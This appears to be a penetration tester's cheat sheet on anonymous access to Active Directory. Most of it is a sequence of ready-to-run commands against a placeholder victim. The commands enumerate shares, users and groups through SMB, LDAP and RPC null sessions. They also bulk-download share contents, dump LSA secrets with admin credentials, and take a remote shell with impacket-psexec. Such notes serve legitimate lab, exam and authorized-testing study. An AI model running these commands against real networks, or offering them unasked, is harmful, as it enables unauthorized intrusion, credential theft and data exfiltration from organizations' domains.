#AD_anonymous_access
# <span style="color:#FF5555">SMB null session</span>

```bash
smbclient -L //$VICTIM_IP -N     # List shares without creds

#smbmap
smbmap -H $VICTIM_IP -u '' -p ''

# shares
nxc smb $VICTIM_IP -u '' -p '' --shares   
nxc smb $VICTIM_IP -u 'guest' -p '' --shares
   
# users   
nxc smb $VICTIM_IP -u '' -p '' --users   
nxc smb $VICTIM_IP -u 'guest' -p '' --users

# write all the files in your local system
# EXCLUDE_FILTER : to exclude some shares, as some of shares contain rough/huge data
nxc smb $VICTIM_IP -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_FILTER='print$, ipc$'
# Include shares with size with 50mb 
nxc smb $VICTIM_IP -u '' -p '' --share 'SHARE_NAME' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=52428800

# for multiple ips
nxc --verbose smb ./ips.txt -u $USER -p '$PASS' --continue-on-success

## if the we found the credents of user which is local administrator then we can run command to dump the lsa
nxc smb $VICTIM_IP -u $USER -p User1@#$%6 --lsa --verbose

# Connecting to the system if smb is Pwned!
impacket-psexec $DOMAIN/Administrator@Pass123123@$VICTIM_IP

# getting all smb files from folder
recurse
prompt OFF
mget *


# Connect to SMB using Kerberos authentication (-k) instead of NTLM 
# -k flag is required when NTLM is disabled on the target (STATUS_NOT_SUPPORTED) OR (NTLM:False)
# Use FQDN (dc01.$DOMAIN) not IP for Kerberos to work properly
nxc smb dc01.$DOMAIN -u $USER -p $PASS -k --shares
```

# <span style="color:#FF5555">LDAP anonymous bind</span>

```bash
ldapsearch -x -H ldap://$DC_IP -s base namingcontexts
nxc ldap $DC_IP -u '' -p '' -M ldap-checker
```

# <span style="color:#FF5555">RPC null session</span>
checking for null sessions to get the usernames

```bash
rpcclient $VICTIM_IP
rpcclient -U "" -N $VICTIM_IP
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querygroupmem 0x200
```
